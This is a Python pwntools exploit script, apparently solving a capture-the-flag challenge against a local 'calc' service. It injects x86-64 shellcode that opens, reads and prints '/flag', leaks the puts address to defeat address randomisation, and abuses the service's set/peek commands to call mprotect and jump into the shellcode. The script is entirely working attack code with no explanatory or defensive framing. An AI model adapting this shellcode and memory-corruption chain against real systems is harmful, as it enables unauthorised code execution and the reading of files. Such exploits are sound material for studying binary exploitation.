#! /usr/bin/python3
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['wt.exe', 'wsl']
#filename = "./pwn"
host = "127.0.0.1"
port = 38483
#elf = context.binary = ELF(filename)
gs = '''
b main
'''
def start():
 if args.P:
  return process(elf.path)
 elif args.R:
  return remote(host, port)
 else:
  return gdb.debug(elf.path, gdbscript = gs)
io = start()

io.recvuntil(b"api key: ")

shellcode = asm('''
    .intel_syntax noprefix
    /* open("/flag", O_RDONLY) */
    mov rax, 0x67616c662f
    push rax
    push rsp
    pop rdi
    xor esi, esi
    push 2
    pop rax
    syscall
    /* read(fd, rsp, 0x7f) */
    xchg eax, edi
    xor eax, eax
    push rsp
    pop rsi
    push 0x7f
    pop rdx
    syscall
    /* write(1, rsp, 0x7f) */
    push 1
    pop rax
    push 1
    pop rdi
    syscall
''')

io.send(b'sk-'+shellcode)

io.recvuntil(b"puts @ ")
puts_addr= int(io.recv(14),16)
log.success(f"puts @ {puts_addr:#x}")
io.recvuntil(b"calc> ")
ABS_addr=puts_addr+20
io.sendline(f"peek {ABS_addr:#x}".encode())
io.recvuntil(b"] = ")
x = int(io.recv(10), 16)
x = u32(p32(x), sign=True)
ABS_addr=ABS_addr+x+4
mprotect_plt_addr=ABS_addr+0x360
log.success(f"mprotect @ {mprotect_plt_addr:#x}")
io.recvuntil(b"calc> ")
io.sendline(b"get -1")
io.recvuntil(b"(")
shellcode_addr = int(io.recv(18), 16)-0x24b6+0x5083
shellcode_page_addr= shellcode_addr&0xfffffffffffff000
gslot_addr = shellcode_addr-0x23
log.success(f"shellcode @ {shellcode_addr:#x}")
log.success(f"shellcode_page @ {shellcode_page_addr:#x}")
log.success(f"gslot @ {gslot_addr:#x}")

io.sendline(f"setg g0 {(mprotect_plt_addr):#x}".encode())
io.sendline(f"setg g1 0x8000")
io.sendline(f"set -1 {(puts_addr+0xdf):#x}".encode())
io.sendline(f"set 0 7")
io.sendline(f"set 1 0x1000")
io.sendline(f"set 2 {(gslot_addr+0x8):#x}".encode())
io.sendline(f"set 4 {(gslot_addr-0x38):#x}".encode())
io.sendline(f"set 5 {(puts_addr+0x6f):#x}".encode())
io.sendline(f"set 13 {(shellcode_addr):#x}".encode())
io.sendline(f"peek {shellcode_page_addr:#x}".encode())

io.interactive()
